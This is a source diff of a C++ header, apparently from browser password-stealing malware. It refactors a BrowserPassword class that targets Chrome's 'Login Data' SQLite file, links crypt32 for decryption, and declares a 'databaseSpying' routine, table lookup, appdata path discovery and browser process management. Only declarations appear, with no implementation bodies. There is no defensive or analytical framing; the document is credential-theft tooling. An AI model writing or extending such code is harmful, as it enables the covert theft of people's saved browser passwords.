@@ -1,16 +1,11 @@
+#pragma once
+
 #pragma comment(lib, "crypt32.lib")
 #pragma comment(lib, "sqlite3.lib")
 
-#include <iostream>
 #include <string>
-#include <Windows.h>
-#include <ShlObj.h>
-#include <iostream>
-#include <tlhelp32.h>
-#include <tchar.h>
-#include <vector>
 
-#include "Log.hh"
+#include "ManageProcess.hh"
 #include "sqlite3.h"
 
 # define C_DBFILE	"\\Google\\Chrome\\User Data\\Default\\Login Data" 
@@ -33,7 +28,7 @@ public:
 	BrowserPassword();
 	~BrowserPassword();
 
-	void		setBrowserType(const BrowserType &type);
+	bool		setBrowserType(const BrowserType &type);
 	void        	databaseSpying();
 
 private:
@@ -43,6 +38,7 @@ private:
 	int			_folder;
 	bool			_ready;
 	const std::vector<HKEY>	_hKey;
+	ManageProcess		_manageProcess;
 
 	/* Methods */
 	void		initChromeBrowser();
@@ -52,5 +48,4 @@ private:
 	void        	findPasswordTable(sqlite3 *db);
 	bool        	findAppdataPath(std::string &appdataPath);
 	bool        	isBrowserInstalled();
-	bool		killProcess(const wchar_t *process);
 };
